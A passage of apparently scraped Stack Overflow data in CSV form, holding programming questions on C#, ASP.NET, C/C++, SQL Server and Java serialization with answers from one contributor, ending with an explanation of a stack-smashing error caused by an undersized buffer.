","33708","","<p>It's important to realize that <code>Session_End</code> doesn't get necessarily executed in the the context of an HTTP request. It may run when a session times out.  You cannot send anything to the client at that time, because it simply isn't there anymore!</p>

<p>Consequently, you should not try to delete the forms authentication cookie in <code>Session_End</code>. If you want, you should do that sooner, when a ""Sign Off"" button is clicked somewhere in your application.  If you need a user's forms authentication ticket to expire after a timeout occures, you should simply set the cookie expiration time appropriately (possibly equivalent to session timeout value) in the config file.</p>
"
"<p>I would like to bin a set of objects, in particular Point types with an x and y value so that I can count the number of points at each x, y pair that exists in the set of Points. The max value of x and y is [-1000,1000] so it is easy enough to generate a unique hash code for each possible point.</p>

<p>For the actual binning process, can this be done using a Dictionary. Does the GetHashCode get used for this when I add/lookup a Point to the dictionary?</p>

<p>Is there a better way to do binning?</p>
","33708","","<p>Yes, unless you pass a custom instance to provide hash codes and check equality when you construct the <code>Dictionary</code> instance, <code>GetHashCode</code> and <code>Equals</code> methods for your type will be used.</p>

<p>To provide your custom hashing mechanism, you can simply override <code>GetHashCode</code> and <code>Equals</code>.</p>
"
"<p>I have a function with definition :</p>

<pre><code>int foobar(char *ptr,...)
</code></pre>

<p>the function call is as follows :</p>

<pre><code>int (*fooptr) (char *,...) = foobar;
</code></pre>

<p>I am not able to understand how is the function getting called ...
Thanks in advance</p>
","33708","","<p>The function is not getting called in your example. Its address is stored in the <code>fooptr</code> variable, which is a function pointer. If you later call that function pointer while it's still pointing to <code>foobar</code> function, it'll call <code>foobar</code> function.</p>

<p>You can write the second line as:</p>

<pre><code>// declare fooptr as a variable of type function pointer 
// taking (char*,...) and returning int
int (*fooptr) (char *,...);  
// take the address of foobar function and assign it to fooptr
fooptr = &amp;foobar;
</code></pre>

<p>to make it clearer.</p>
"
"<p>I'm just wondering, is there a way to get the <code>GET</code> parameters and <code>POST</code> parameters in just one function or <code>Collection</code> in ASP.NET? Like using <code>$_REQUEST</code> in PHP? I'm using VB.NET.</p>
","33708","","<p><code>Request[""VariableName""]</code> (in C#) and <code>Request(""VariableName"")</code> (in VB) should work.</p>

<p>See <a href=""http://msdn.microsoft.com/en-us/library/system.web.httprequest.item.aspx"" rel=""nofollow""><code>HttpRequest.Item</code> indexer</a>:</p>

<blockquote>
  <p>Name-value pairs are returned in the following order:  </p>
  
  <ol>
  <li>Query-string parameters.  </li>
  <li>Form fields.</li>
  <li>Cookies.  </li>
  <li>Server variables.</li>
  </ol>
  
  <p>If the specified key is not found, then <code>null</code> is returned. </p>
</blockquote>
"
"<p>In my table, I use the bit type for <code>IsTrue</code> column.</p>

<p>When I execute the select command:</p>

<pre><code>SqlDataReader reader = command.ExecuteReader(); 
</code></pre>

<p>I'm not sure that what would the <code>reader[""isTrue""]</code> return ?</p>

<p>I tried doing the comparison</p>

<pre><code>reader[""isTrue""].ToString().Equals(""0"")
</code></pre>

<p>but it didn't work well. Can somebody tell me what I did incorrectly?</p>
","33708","","<p>It returns a boolean value.</p>

<pre><code>bool value = (bool)reader[""IsTrue""];
</code></pre>

<p>If you know the index of the column in the result set, you can use:</p>

<pre><code>bool value = reader.GetBoolean(index);
</code></pre>
"
"<p>What exactly is the mechanism by which the linux knows that a file has been closed ?
I know commands such as INOTIFY would trigger IN_CLOSE_WRITE event when a file is closed. But how does it work ? What triggers close of a file ?</p>

<p>Similarly how does OS know that a file has been opened and where does it register that fact?</p>
","33708","","<p>The OS (i.e. kernel) is the one that actually opens and closes files. A program will have to tell the OS to open/close files on its behalf every time it wants to do so via <em>system calls</em>. The OS can simply keep track of these calls that go through itself.</p>
"
"<p>I really appreciate this community and all the help it has provided towards my programming problems that I've had in the past.</p>

<p>Now unfortunately, I cannot seem to find an answer to this problem which, at first glance, seems like a no brainer. <em>Please note that I am currently using C++ 6.0.</em></p>

<p>Here is the code that I am trying to convert from C#:</p>

<pre><code>byte[] Data = new byte[0x200000];
uint Length = (uint)Data.Length;
</code></pre>

<p>In C++, I declared the new byte array <code>Data</code> as follows:</p>

<pre><code>BYTE Data[0x200000];
DWORD Length = sizeof(Data) / sizeof(DWORD);
</code></pre>

<p>When I run my program, I receive stack overflow errors (go figure). I believe this is because the array is so large (2 MB if I'm not mistaken).</p>

<p>Is there any way to implement this size array in C++ 6.0?</p>
","33708","","<p>Currently, you are allocating a lot of memory on the thread's stack, which will cause stack overflow, as stack space is usually limited to a few megabytes. You can create the array on the heap with <code>new</code> (by the way, you are calculating the array length incorrectly):</p>

<pre><code>DWORD length = 0x200000;
BYTE* Data = new BYTE[length];
</code></pre>

<p>You might as well use <code>vector&lt;BYTE&gt;</code> instead of a raw array:</p>

<pre><code>vector&lt;BYTE&gt; Data;
int length = Data.size();
</code></pre>
"
"<p>I had to implement 2 interface same time with different generic parameter as below. I get confused enough about it. I had no idea which one of them iterate itself in foreach. Now i understand first one is implicitly choosen. </p>

<p>I have tried <code>new BarList().GetEnumerator()</code> but i can not specify type parameter on method level. </p>

<p>Only solution i have found it that casting it to interface like(<code>new BarList() as IEnumerable&lt;string&gt;</code>)</p>

<p>After confusing about it enough. I just wanted to know that this design is not really good idea ? I have to avoid to implement same generic interface one more time ? </p>

<pre><code>class Program
{
    static void Main(string[] args)
    {
        foreach (var item in new BarList())
        {

        }
    }
}

class BarList: IEnumerable&lt;string&gt;, IEnumerable&lt;int&gt;
{

    public IEnumerator&lt;int&gt; GetEnumerator()
    {
        throw new NotImplementedException();
    }

    System.Collections.IEnumerator System.Collections.IEnumerable.GetEnumerator()
    {
        throw new NotImplementedException();
    }

    IEnumerator&lt;string&gt; IEnumerable&lt;string&gt;.GetEnumerator()
    {
        throw new NotImplementedException();
    }
}
</code></pre>

<h2><strong>Edit:</strong></h2>

<p>Let me explain why i am going in this way.</p>

<p>I had to Implement <code>IPagedList&lt;T&gt;</code> interface which is inherited from <code>IList&lt;T&gt;</code>. I wanted to write extension method which convert it to My view model. like below</p>

<p><code>GetAll().ToPagedList(pageindex)</code>;//which is returning IPagedList Then i wanted to use it like below;</p>

<pre><code>GetAll().ToPagedList(pageindex).ToViewModel&lt;T,TViewModel&gt;();
</code></pre>

<p>For achieve this I tried to return <code>IPagedList&lt;ViewModel&gt;</code> by that extension method.In that case I have to implement IPagedList 2 times with different parameter. But this strategy made confusing things. This is reason of it.</p>
","33708","","<p>Your current design is confusing. While you have not provided any information about the nature of the collection itself, from the name, I can assume you are supposed to iterate over a bunch of products. Perhaps, you should simply have a class of type <code>Product</code> with a <code>string</code> property and an <code>int</code> property and simply return an <code>IEnumerable&lt;Product&gt;</code> instead.</p>

<p>This way, with LINQ extension methods, you can compose the <code>IEnumerable&lt;T&gt;</code> object you actually mean with:</p>

<pre><code>collection.Select(product =&gt; product.IntegerProperty)
collection.Select(product =&gt; product.StringProperty)
</code></pre>

<p>Of course, you can provide helper methods inside the object as well:</p>

<pre><code>class ProductCollection : IEnumerable&lt;Product&gt; {
    public IEnumerable&lt;Product&gt; GetEnumerator() {
       // ... return Product objects here.
    }
    public IEnumerable&lt;int&gt; AsIntegerCollection() {
       // yield the integer collection here
    }
    public IEnumerable&lt;string&gt; AsStringCollection() {
       // yield the string collection here
    }
}
</code></pre>
"
"<p>I've got an asp:Image. I want this control to display, only if <code>&lt;%#Eval(""Image"")%&gt;</code> is not <code>null</code>.</p>

<p>I do not know how to write this conditional statement. What I'm trying to say is something like this (if the value of 'image' taken from the data structure is not null, then display the image. Otherwise, do not):</p>

<pre><code>&lt;%#Eval(""Image"")%&gt; != 0 ? &lt;asp:Image ID=""image"" runat=""server""/&gt;
</code></pre>

<p>I'm aware that this is not the syntax - consider it as pseudocode, as I have never had to write a conditional statement in the markup.</p>

<p>Any ideas? :)</p>
","33708","","<p>You can bind the <code>Visible</code> property of your control to the expression and call <code>DataBind()</code> while the page is loading:</p>

<pre><code>&lt;asp:Image runat=""server"" id=""image"" Visible='&lt;%#Eval(""Image"") != null %&gt;' /&gt;
</code></pre>

<p>If you are not using server controls and want to show/hide simple markup, you can simply enclose it in an <code>if</code> statement:</p>

<pre><code>&lt;% if ( condition ) { %&gt;
    &lt;img src='&lt;%= linkToImageSource %&gt;' /&gt;
&lt;% } %&gt;
</code></pre>
"
"<p>I'm working in Visual studio 2010. I Added a directory to  Project Properties -> Linker -> General -> Additional Directories</p>

<p>The project compiles if I use</p>

<pre><code> ""file.h""
</code></pre>

<p>but not if i use</p>

<pre><code> &lt;file&gt;
</code></pre>
","33708","","<p>You are probably assuming that <code>&lt; &gt;</code> implicitly adds <code>.h</code> to the end of the file name. This is not true. Whether you use <code>&lt; &gt;</code> or <code>"" ""</code> has no significance on the name of the file. It basically tells the implementation in which order it should traverse include directories to find the header file.</p>

<p>To quote the standard:</p>

<blockquote>
  <p>A preprocessing directive of the form<br>
      <code># include &lt;h-char-sequence&gt; new-line</code><br>
  searches a sequence of implementation-deï¬ned places for a header identified uniquely by the speciï¬ed sequence between the <code>&lt;</code> and <code>&gt;</code> delimiters, and causes the replacement of that directive by the entire contents of the header. How the places are speciï¬ed or the header identiï¬ed is implementation-deï¬ned.  </p>
  
  <p>A preprocessing directive of the form<br>
    <code># include ""q-char-sequence"" new-line</code><br>
  causes the replacement of that directive by the entire contents of the source ï¬le identiï¬ed by the specified sequence between the <code>""</code> delimiters. The named source ï¬le is searched for in an implementation-deï¬ned manner. If this search is not supported, or if the search fails, the directive is reprocessed as if it read</p>
  
  <p><code># include &lt;h-char-sequence&gt; new-line</code><br>
  with the identical contained sequence (including <code>&gt;</code> characters, if any) from the original directive</p>
</blockquote>
"
"<p>Not really sure about the <code>is</code> keyword, but I <em>think</em> these two are the same.  Can anyone confirm this?</p>

<pre><code>public bool Equals(Object obj)
{ 
   if (obj == null) return false;
   MyType t = (MyType)obj;
   if (t == null) return false;
   return true;
}
</code></pre>

<p>and the other is...</p>

<pre><code>public bool Equals(Object obj)
{ 
   return obj is MyType;
}
</code></pre>
","33708","","<p>No, they are definitely not equal. The cast to <code>(MyType)</code> will throw <code>InvalidCastException</code> immediately if <code>obj</code> isn't an instance of <code>MyType</code>.  The expression will not evaluate to <code>null</code> if the cast fails. <code>as</code> operator exhibits the behavior you are expecting from that cast. <a href=""http://stackoverflow.com/questions/2139798/why-is-the-c-sharp-as-operator-so-popular/2139818#2139818"">My answer to another question</a> discusses this in a bit more detail. </p>
"
"<p>I have an ivar in my Obj-C class that's a C array (I'm not interested in making it an Obj-C property). Simple enough. Now in my class's init method I'd like to seed this array with some values using the C array shorthand init as seen in my .m below. But I'm fairly positive this is creating a local variable by the same name and not initializing my instance variable. I can't put my array init in the interface and I cannot declare an ivar in an implementation. Am I just stuck doing some sort of deep copy over or do I have another option?</p>

<p>In GameViewController.h</p>

<pre><code>#define kMapWidth 10
#define kMapHeight 10

@interface GameViewController : UIViewController
{
    unsigned short map[kMapWidth * kMapHeight];
}

@end
</code></pre>

<p>In GameViewController.m</p>

<pre><code>- (id)init
{
    if ((self = [super init]))
    {
        unsigned short map[kMapWidth * kMapHeight] = { 
            1,1,1,1,1,1,1,1,1,1,
            1,0,0,0,0,0,0,0,0,1,
            1,0,0,0,0,0,0,0,0,1,
            1,0,0,0,0,0,0,0,0,1,
            1,0,0,0,0,0,0,0,0,1,
            1,0,0,0,0,0,0,0,0,1,
            1,0,0,0,0,0,0,0,0,1,
            1,0,0,0,0,0,0,0,0,1,
            1,0,0,0,0,0,0,0,0,1,
            1,1,1,1,1,1,1,1,1,1,
        };
    }
    return self;
}
</code></pre>
","33708","","<p>You are right. What you are doing is initializing a local variable, shadowing the instance variable. You can initialize a local array and <code>memcpy</code> it to the instance variable:</p>

<pre><code>static const unsigned short localInit[] = { 
        1,1,1,1,1,1,1,1,1,1,
        1,0,0,0,0,0,0,0,0,1,
        1,0,0,0,0,0,0,0,0,1,
        1,0,0,0,0,0,0,0,0,1,
        1,0,0,0,0,0,0,0,0,1,
        1,0,0,0,0,0,0,0,0,1,
        1,0,0,0,0,0,0,0,0,1,
        1,0,0,0,0,0,0,0,0,1,
        1,0,0,0,0,0,0,0,0,1,
        1,1,1,1,1,1,1,1,1,1,
};

memcpy(map, localInit, sizeof(localInit));
</code></pre>
"
"<p>I have a problem working in C++ with txt files.. First of all, I want to make a program which
have .cpp and .h files.. which have classes and functions.</p>

<p>So here is my problem:</p>

<p>for example, i have txt file which contains 5 lines of text (players names). So I want to make every line of that txt to be a variable of string.. But as long as I want to use that new variables they suddently disappears. </p>

<p>Here is program code:</p>

<pre><code>#include &lt;iostream&gt;
#include &lt;fstream&gt;
#include &lt;string&gt;
using namespace std;

int main () {
    string line;
    int i;
    string player[5];

    ifstream myfile (""1-Efes Pilsen.txt"");

    if (myfile.is_open())
    {
        while ( myfile.good() )
        {
            for (i=0;i&lt;5;i++)
            {
                getline (myfile,line);
                player[i] = line;
            }
            // after this point I still can use new variables
        }
    }
    else cout &lt;&lt; ""Unable to open file""; 

    cout &lt;&lt; player[1]; // &lt;--- NOT WORKING. WHY?

    myfile.close();   
}
</code></pre>
","33708","","<p>While it is not clear to me how it's not working, I can <em>guess</em> that there are more contents in the file than just 5 strings (perhaps another newline) which causes the <code>while</code> condition to evaluate to <code>true</code> causing the <code>for</code> loop to read 5 lines (which will fail and not actually read anything) and replace the good values in the string array with crappy ones (empty string).</p>

<p>Instead of having an outer <code>while</code> loop, you probably want to add the condition to the <code>for</code> loop itself; something along the lines of:</p>

<pre><code>for (i=0;i&lt;5 &amp;&amp; myfile.good();i++)
{
   getline (myfile,line);
   player[i] = line;
}
</code></pre>
"
"<p>I'm a little confused as to how longs work in C.</p>

<p>If I ask for the maximum value of a long in Java I get a number in the quintillions.  If I ask for it in C, signed or unsigned, it's in the billions.</p>

<p>Java is built on C... so where is the difference coming from?</p>

<p>I've also tried representing literals with long long values, unsigned/signed long values and long int values.  None of them seem to handle numbers past the mid-billions.  Why?  Am I making a mistake?</p>
","33708","","<p>The C standard defines <code>long</code> to be at least as large as <code>int</code>. The actual size is implementation dependent.  This is not the case for Java, in which <code>long</code> is required to be 64 bits long.</p>

<p>The C99 standard defines fixed size integer types like <code>int64_t</code> defined in <code>stdint.h</code> that you can use if you need fixed size integers on all platforms.</p>
"
"<p>I've recently changed a couple of functions recently while debugging a cte query (have gotten help here). I just changed a couple of functions.. this got my query to work.. but now when my C# client code calls those functions through stored procs for my program logic, I get the error ""Procedure or function 'DateTimeOfNextAvailableDataRun' expects parameter '@NextDateTime', which was not supplied.
"" Maybe multiple values are coming back?</p>

<p>Here's the function in its current form:</p>

<pre><code>ALTER FUNCTION dbo.NextAvailableDataDownloadDateTime()
    RETURNS date
BEGIN
    RETURN (SELECT DATEADD(hour, 18, MIN(TradingDate)) AS TrDate
    FROM tblTradingDays
    WHERE (DATEADD(hour, 18, TradingDate) &gt; dbo.LatestDataDownloadDate()))
END
</code></pre>

<p>And the stored proc that invokes it:</p>

<pre><code>ALTER PROC DateTimeOfNextAvailableDataRun
    @NextDateTime DateTime2 OUTPUT
AS
    SELECT @NextDateTime = dbo.NextAvailableDataDownloadDateTime()
</code></pre>

<p>And lastly my client code, which did run before the change:</p>

<pre><code>public DateTime DateTimeOfNxtAvailableDataRun()
            {
                DateTime dateTimeOfNxtAvailableDataRun;

                using (SqlCommand cmd = new SqlCommand(""DateTimeOfNextAvailableDataRun"", this.sqlConnection))
                {
                    cmd.CommandType = System.Data.CommandType.StoredProcedure;
                    cmd.ExecuteNonQuery();
                    dateTimeOfNxtAvailableDataRun = (DateTime)cmd.ExecuteScalar();
                }

                return dateTimeOfNxtAvailableDataRun;
            }
</code></pre>

<p>Any takers? Again, the functions work within my sql server query (see recent posts by me) but now the calling code disagrees..</p>
","33708","","<p>You should modify the body of the <code>using</code> statement and add an output parameter before executing the command. </p>

<pre><code>var outputParameter = new SqlParameter { 
    ParameterName = ""@NextDateTime"",
    Direction = ParameterDirection.Output
};
cmd.Parameters.Add(outputParameters);
cmd.ExecuteNonQuery();
return (DateTime)outputParameter.Value;
</code></pre>
"
"<p>If I was to declare a variable inside of a loop is it faster to have the declaration outside of the loop, i.e. does the program reallocate the memory for n at each iteration or use the same memory location throughout.</p>

<pre><code>for(int i=0;i&lt;10;i++)
{
    int n = getNumber();
    printf(""%d\n"",n);
}
</code></pre>

<p>or</p>

<pre><code>int n;
for(int i=0;i&lt;10;i++)
{
    n = getNumber();
    printf(""%d\n"",n);
}
</code></pre>
","33708","","<p>Variables are not really ""created"" or ""destroyed"". They are concepts at the abstraction level of the programming language. The compiler is not required to have a one to one mapping between a variable and memory addresses. In practice, most of the time, stack space for local variables is allocated at once at the beginning of the function, so it won't make a difference in performance.</p>

<p>Note that, C++, unlike C, which doesn't have a notion for constructors, supports object construction and destruction, so if you were to define a variable of a class type in a for loop, like the following,</p>

<pre><code>class MyClass { 
    public: MyClass() { cout &lt;&lt; ""hello world"" &lt;&lt; endl; }
};
//...
for (int i = 0; i &lt; 10; ++i) {
   MyClass m;
} 
</code></pre>

<p>you'd call its constructor every time, effectively printing ""hello world"" ten times. This is very different from C declarations and should not be confused with it.</p>
"
"<p>Under 64bit Windows 7, I want to start a 64bit executable(myapp64.exe) from a 32bit executable(myapp32.exe). Can I use CreateProcess, ShellExecute or ShellExecuteEx functions in myapp32.exe to do this? Will be there any problems or limitations?</p>

<p>I use Visual C++ 2008 to write both myapp32.exe and myapp64.exe.</p>
","33708","","<p>It should work fine, as if the target were 32 bit too.  The 64 bit process will be completely separate from the 32 bit one (naturally) so its bitness doesn't really make any difference.</p>

<p>Problems might start to arise if you try to communicate with the 64 bit process without taking that into account.</p>
"
"<p>I have a base class <code>B</code> and several derived template classes <code>D&lt;int&gt;</code>, <code>D&lt;float&gt;</code>, <code>D&lt;double&gt;</code>, etc. (so more than ten)</p>

<p>In my program, I find a situation where I have a B pointer that I KNOW points to an instance one of the D specializations.  I also have a unique key that identifies the derived type.</p>

<p>So, I want to call the correct derived class method using my base class pointer and the unique type key.  I actually want to do this in several places, so the one solution I have come up with is not only ugly, but cumbersome. </p>

<p><strong>Is there a better way to access the derived class's members having a base pointer and a unique key in C++?</strong></p>

<p>I don't want to / can't modify the base class.  boost library is fair game. </p>

<p>Here is my potential code, but I'm not happy with replicating this everywhere I need to access a derived member function/variable.  All of this for one member function call?!!</p>

<pre><code>B * bptr = ...
std::type_info * typekey = ...

if        (typekey == &amp;typeid(D&lt;float&gt;) ) {
    D&lt;float&gt; * dptr = static_cast&lt;D&lt;float&gt;*&gt;(bptr);
    dptr-&gt;derivedMember();
} else if (typekey == &amp;typeid(D&lt;double&gt;) ) {
    D&lt;float&gt; * dptr = static_cast&lt;D&lt;double&gt;*&gt;(bptr);
    dptr-&gt;derivedMember();
} else if (typekey == &amp;typeid(D&lt;int&gt;) ) {
    D&lt;float&gt; * dptr = static_cast&lt;D&lt;int&gt;*&gt;(bptr);
    dptr-&gt;derivedMember();
} 
</code></pre>
","33708","","<p>As noted in the comments, the correct way to handle the situation is by introducing a <code>virtual</code> method and having C++ dispatch the call correctly. </p>

<p>Since you cannot modify the base class, you can insert a new class with the virtual function and derive all the classes from the new class instead. </p>

<p>If you need to replicate this behavior with many functions, possibly ones that are not defined yet and the client code will provide, you can leverage the <a href=""http://en.wikipedia.org/wiki/Visitor_pattern"" rel=""nofollow"">Visitor pattern</a>.  In fact, if you cannot change the base class, you can at least use a Vistior-like technique to keep the tedious typekey checks in a single location and take out the actual operations to separate classes. Â This will keep you from having to rewrite the typekey checks should another <code>derivedMember</code>-like function.</p>
"
"<p>Consider the sample code below:</p>

<pre><code>#include &lt;iostream&gt;

using namespace std;

class A
{
    private:
        static int a;
        int b;

    protected:

    public:

        A() : b(0) {}

        void modify()
        {
            a++;
            b++;
        }

        void display()
        {
            cout &lt;&lt; a &lt;&lt;""\n"";
            cout &lt;&lt; b &lt;&lt;""\n"";
        }

};

int A::a=0;

class B : public A {

    private:
        int b;

    public:
        B(): b(5)
        {
        }

};

int main()
{
    A ob1;
    B ob2;
    ob1.display();
    ob2.display();

    return 0;

}
</code></pre>

<p>In the code above, the <code>class A</code> has a private data member <code>b</code>and <code>class B</code> also has a private data member <code>b</code>. The function <code>display()</code> is used to display the data members.
When i invoke display() using <code>ob1.display()</code>, display() accesses the private data member <code>b</code> of class A. I understand that. But when i invoke display using <code>ob2.display</code>, which <code>b</code> does display() access? Is it the <code>b</code> of class A or <code>b</code> of class B? Kindly explain the why it accesses <code>class A's b</code> or <code>class B's b</code></p>
","33708","","<p>It will access <code>A::b</code>. The <code>display</code> method implementation in class <code>A</code> has no clue about the existence of <code>B::b</code> at all, let alone using it.  For all intents and purposes, <code>B::b</code> is separate from <code>A::b</code>.  Only in the scope of <code>B</code> itself, the name conflict makes <code>b</code> refer to <code>B::b</code>, hiding <code>A::b</code>.  Member variables cannot be <code>virtual</code>.</p>
"
"<p>I have Users->Orders tables (one to many) and would like to select all users which have specified Orders. I have tried Linq below but it fails with error. How to write such Linq query?</p>

<pre><code>DataAccess.Instance.Users.Where(p =&gt; p.Orders.Where(o =&gt; o.ProductId == productId))
</code></pre>
","33708","","<p>You should try:</p>

<pre><code>DataAccess.Instance.Users.Where(p =&gt; p.Orders.Any(o =&gt; o.ProductId == productId))
</code></pre>

<p>Note that the second <code>Where</code> is changed to <code>Any</code> which returns a boolean value and satisfies the type of the expression tree expected by the first <code>Where</code>: <code>Where</code> needs a condition, not a set of values retrieved from elsewhere.</p>
"
"<p>i know that bss segment contains uninitialized variables which will be given 0 as initial value,but why we don't just use the data segment to store them?</p>

<p>i read that it speed up execution because the os loader initialize all these variables at once by calling memset, however, I'm not very convinced because the loader can call memset to initialize them in data segment also!</p>
","33708","","<p>Because you might have a huge set of uninitialized values. You will have to fill the binary with zeros (or any value, for that matter, but <em>something</em> has to be there) if you were to use the data section for that purpose. Imagine adding a megabyte of zeros to the executable file...</p>
"
"<p>Could someone point me, why here:</p>

<pre><code>Byte b = 100; 
b = (Byte)(b+200);
</code></pre>

<p>I have to use explicit type conversion. But here</p>

<pre><code>Byte b = 100;
b += 200;
</code></pre>

<p>I don't need to do this?</p>

<p>Does compiler generate different IL code for this two cases? And which case is better?</p>
","33708","","<p>Because the standard permits it (see the second case below):</p>

<blockquote>
  <h3>14.14.2 Compound assignment</h3>
  
  <p>An operation of the form <code>x</code> <em>op</em><code>=</code> <code>y</code> is processed by applying binary operator overload resolution (Â§14.2.4) as if the operation was written <code>x</code> <em>op</em> <code>y</code>. Then,  </p>
  
  <ul>
  <li><p>If the return type of the selected operator is implicitly convertible to the type of <code>x</code>, the operation is evaluated as <code>x = x</code> <em>op</em> <code>y</code>, except that <code>x</code> is evaluated only once.</p></li>
  <li><p>Otherwise, if the selected operator is a predefined operator, if the return type of the selected operator is explicitly convertible to the type of <code>x</code>, and if <code>y</code> is implicitly convertible to the type of <code>x</code> or the operator is a shift operator, then the operation is evaluated as <code>x = (T)(x</code> <em>op</em> <code>y)</code>, where <code>T</code> is the type of <code>x</code>, except that <code>x</code> is evaluated only once.</p></li>
  <li>Otherwise, the compound assignment is invalid, and a compile-time error occurs.</li>
  </ul>
</blockquote>

<p>The IL code should be essentially identical in this case. Of course, if evaluating <code>b</code> has side effects, it will be evaluated twice in the <code>b = (byte)b + 200</code> case and only once when using compound assignment.</p>
"
"<p>Suppose we have an arbitrary graph represented by nodes and pointers like this:</p>

<pre><code>class Node
{
    public ValueType data;
    public ArrayList&lt;Node&gt; adj;
}
</code></pre>

<p>Now, I want to take a copy of it or write/read it on the disk (AKA serialize/deserialize). I also know that it can be done using a search algorithm + associative arrays. And, it turns out that this method is called <a href=""http://en.wikipedia.org/wiki/Pointer_swizzling"" rel=""nofollow"">swizzling</a>.</p>

<p><strong>Here goes my question:</strong></p>

<p>I have heard that in Java by declaring the class as Serializable, this feature is provided for you automatically. (which sounds like a magic to me!)</p>

<p>Is this statement correct? Does Java automatically run BFS to traverse the graph and swizzle the pointers? In other words, does serialize/deserialize clone the object for me? (a completely brand new object with the same structure but new nodes and updated pointers)</p>

<p>If yes, then what if in some cases I just want to copy the pointers? what if I want to serialize the object just to keep the original pointers?</p>

<p>I appreciate any comments on this. :-)</p>
","33708","","<p>I'll address your last question first.  The purpose of serialization is not cloning an object graph in memory.  It is to transform an object graph to a stream of bytes in order to do things like saving in a file or sending across the wire.  The deserialization process might be done on a different computer, at a different time, in a different process, or even by a non-Java program, so it is not a reasonable expectation to get references to the same objects as before.  It is the structure and contents of the object graph that are being saved and later restored, not in-memory addresses.  For precisely this reason, it does not make sense for all objects to be serializable.  For instance, serializing a <code>Thread</code> is not going to be useful, because it is not going to be meaningful outside the current instance of a program.</p>

<p>The magic behind automatic serialization is not very complex.  Ignoring custom serialization methods that you can write for your own classes to precisely control the serialization and deserialization behavior, yes, the system will effectively traverse the object graph in order to generate a stream of bytes.  This traversal is generally done as a DFS, not BFS.  Basically, you ask Java to serialize an object, passing a reference to it.  That reference will serve as the root of the object graph.  From there, Java will recursively serialize the fields of that object.  Of course, it does track circular references and writes out appropriate markings in the output stream so that the deserializer is able to hook up the pointers and recreate the structure as it was before. </p>
"
"<p>I am trying to write a simple Gui to produce a random password.
The code I am trying to use is:</p>

<p><code>using System.Web.Security;</code></p>

<p><code>Password_txtBx.Text = Membership.GeneratePassword(12, 1);</code></p>

<p>I am getting the error: ""The name 'Membership' does not exist in the current context""</p>

<p>I have changed the code to this:</p>

<p><code>Password_txtBx.Text = System.Web.Security.Membership.GeneratePassword(12, 1);</code></p>

<p>The error message I get then is: ""The type or namespace 'SecurityMembership' does not exist in the namespace 'System.Web' (are you missing an assembly reference?)""</p>

<p>I have referenced System.Web.Security in both examples above. Is there any way to fix my problem?</p>
","33708","","<p>Are you sure that is the exact code/error message?</p>

<p>The error message you posted:</p>

<blockquote>
  <p>""The type or namespace 'SecurityMembership' does not exist in the namespace 'System.Web' (are you missing an assembly reference?""</p>
</blockquote>

<p>implies you are trying to access <code>SecurityMembership</code> class. There is no such thing. You should add a dot after <code>Security</code>. Also, the class is defined in <code>System.Web.dll</code>, not <code>System.Web.Security.dll</code>.  Note that <strong>System.Web</strong> assembly is not available in .NET Framework Client Profile.  To be able to use that, you need to target full .NET Framework.  You can change the target profile of the project in Project Properties.</p>

<p>There are other ways to <a href=""http://stackoverflow.com/questions/54991/generating-random-passwords"">generate random passwords</a> that do not require you to add a dependency on <code>System.Web.dll</code> assembly (since you are doing this in a Windows Forms environment). Additionally, you can use <code>System.Security.Cryptography</code> classes to generate cryptographically secure random numbers.</p>
"
"<p>I've created a file which prints Hello, world as many times at the user wants to give input.</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
int main() {
    char message[10];
    int count, i;

    strcpy(message, ""Hello, world!"");

    printf(""Repeat how many times? "");
    scanf(""%d"", &amp;count);

    for(i=0; i &lt; count; i++)
        printf(""%3d - %s\n"", i, message);
}
</code></pre>

<p>No matter what the number entered it always results in a ""stack smash"". Here is the program, can anyone come up with a conclusion to why it is doing this? Here is the ""traceback"" that occurs after the stack smash is detected:</p>

<pre class=""lang-none prettyprint-override""><code>sean@blue:~/programming$ ./a.out
Repeat how many times? 12
  0 - Hello, world!
  1 - Hello, world!
  2 - Hello, world!
  3 - Hello, world!
  4 - Hello, world!
  5 - Hello, world!
  6 - Hello, world!
  7 - Hello, world!
  8 - Hello, world!
  9 - Hello, world!
 10 - Hello, world!
 11 - Hello, world!
*** stack smashing detected ***: ./a.out terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0x1f8c75]
/lib/i386-linux-gnu/libc.so.6(+0xe8c27)[0x1f8c27]
./a.out[0x8048524]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0x129113]
./a.out[0x80483f1]
======= Memory map: ========
00110000-00288000 r-xp 00000000 08:01 1577912    /lib/i386-linux-gnu/libc-2.13.so
00288000-0028a000 r--p 00178000 08:01 1577912    /lib/i386-linux-gnu/libc-2.13.so
0028a000-0028b000 rw-p 0017a000 08:01 1577912    /lib/i386-linux-gnu/libc-2.13.so
0028b000-0028e000 rw-p 00000000 00:00 0 
0036b000-0036c000 r-xp 00000000 00:00 0          [vdso]
00454000-00470000 r-xp 00000000 08:01 1573818    /lib/i386-linux-gnu/libgcc_s.so.1
00470000-00471000 r--p 0001b000 08:01 1573818    /lib/i386-linux-gnu/libgcc_s.so.1
00471000-00472000 rw-p 0001c000 08:01 1573818    /lib/i386-linux-gnu/libgcc_s.so.1
00e7e000-00e9c000 r-xp 00000000 08:01 1573924    /lib/i386-linux-gnu/ld-2.13.so
00e9c000-00e9d000 r--p 0001d000 08:01 1573924    /lib/i386-linux-gnu/ld-2.13.so
00e9d000-00e9e000 rw-p 0001e000 08:01 1573924    /lib/i386-linux-gnu/ld-2.13.so
08048000-08049000 r-xp 00000000 00:14 3801591    /home/sean/programming/a.out
08049000-0804a000 r--p 00000000 00:14 3801591    /home/sean/programming/a.out
0804a000-0804b000 rw-p 00001000 00:14 3801591    /home/sean/programming/a.out
08a9e000-08abf000 rw-p 00000000 00:00 0          [heap]
b77e8000-b77e9000 rw-p 00000000 00:00 0 
b77fc000-b7800000 rw-p 00000000 00:00 0 
bff87000-bffa8000 rw-p 00000000 00:00 0          [stack]
Aborted
</code></pre>
","33708","","<p><code>message</code> can only hold 10 bytes. You are copying the string ""Hello World!"" which is 13 bytes (if you count the null character) and you will end up overwriting and corrupting the stack protector cookie.</p>

<p>The cookie is a random byte inserted by the compiler to make sure that you crash if the return address is modified on stack, preventing potential buffer overflow exploits.</p>

<p>If you are compiling with gcc, to experiment, try adding <code>-fno-stack-protector</code> switch to your compilation statement and trying again. The program will probably crash (but not with a error message like that) and will be vulnerable to buffer overflow exploits. </p>
"
